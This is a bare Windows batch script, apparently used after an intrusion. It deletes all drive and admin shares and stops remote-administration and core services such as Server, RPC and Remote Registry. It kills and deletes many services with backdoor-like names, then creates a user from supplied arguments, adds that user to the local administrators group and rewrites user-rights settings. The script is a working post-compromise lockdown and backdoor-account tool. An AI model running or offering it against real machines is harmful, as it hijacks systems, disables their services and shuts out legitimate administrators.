net share A$ /delete /y
net share B$ /delete /y
net share C$ /delete /y
net share D$ /delete /y
net share E$ /delete /y
net share F$ /delete /y
net share G$ /delete /y
net share H$ /delete /y
net share I$ /delete /y
net share J$ /delete /y
net share K$ /delete /y
net share K$ /delete /y
net share L$ /delete /y
net share M$ /delete /y
net share N$ /delete /y
net share O$ /delete /y
net share P$ /delete /y
net share Q$ /delete /y
net share R$ /delete /y
net share S$ /delete /y
net share T$ /delete /y
net share U$ /delete /y
net share V$ /delete /y
net share W$ /delete /y
net share X$ /delete /y
net share Y$ /delete /y
net share Z$ /delete /y
net share ADMIN$ /delete /y
net share IPC$ /delete /y
net share /delete ADMIN$
net share /delete IPC$
net stop "Remote Registry Service" 
net stop "Computer Browser" 
net stop "server" >> server.txt
net stop "REMOTE PROCEDURE CALL" 
net stop "REMOTE PROCEDURE CALL SERVICE" 
net stop "Remote Access Connection Manager"
net stop "DameWare Mini Control"
net stop "telnet"
net stop "psexecv" 
net stop "messenger" 
net stop "netbios" 
net stop netbios
kill dntu.exe
kill dntu26.exe
kill dwrcs.exe
   sc stop systemnt
   sc delete systemnt
   sc stop ab
   sc delete ab
   sc stop evente
   sc delete evente
   sc stop ntsys
   sc delete ntsys
   sc stop startdll
   sc delete startdll
   sc stop MSVC5
   sc delete MSVC5
   sc stop QOS
   sc delete QOS
   sc stop MMTASK
   sc delete MMTASK
   sc stop radmm
   sc delete radmm
   sc stop mstsk64
   sc delete mstsk64
   sc stop netsecure
   sc delete netsecure
   sc stop svcserv
   sc delete svcserv
   sc stop Slave
   sc delete Slave
   sc stop svcirof
   sc delete svcirof
   sc stop csrsss
   sc delete csrsss
   sc stop keyboard
   sc delete keyboard
   sc stop shell32
   sc delete shell32
   sc stop csrss2
   sc delete csrss2
   sc stop evente
   sc delete evente
   sc stop eventer
   sc delete eventer
   sc stop event
   sc delete event
   sc stop event2
   sc delete event2
   sc stop systemnt
   sc delete systemnt
   sc stop dll32
   sc delete dll32
   sc stop rcmd
   sc delete rcmd
   sc stop sysmgmt
   sc delete sysmgmt
   sc stop system
   sc delete system
   sc stop r_server
   sc delete r_server
   sc stop radmm
   sc delete radmm
   sc stop ftp
   sc delete ftp
   sc stop ir
   sc delete ir
   sc stop identd
   sc delete identd
   sc stop net33
   sc delete net32
   sc stop DWMRCS
   sc delete DWMRCS
   sc stop svchost
   sc delete svchost
   sc stop slimftpd
   sc delete slimftpd
net user /delete mShelp
REM###
net user /add %1 %2
REM###
net localgroup administrators %1 /add
REM###
secedit.exe /configure /areas USER_RIGHTS /db C:\winnt\temp\temp.mdb /CFG temp
del %SystemRoot%\system32\login.cmd
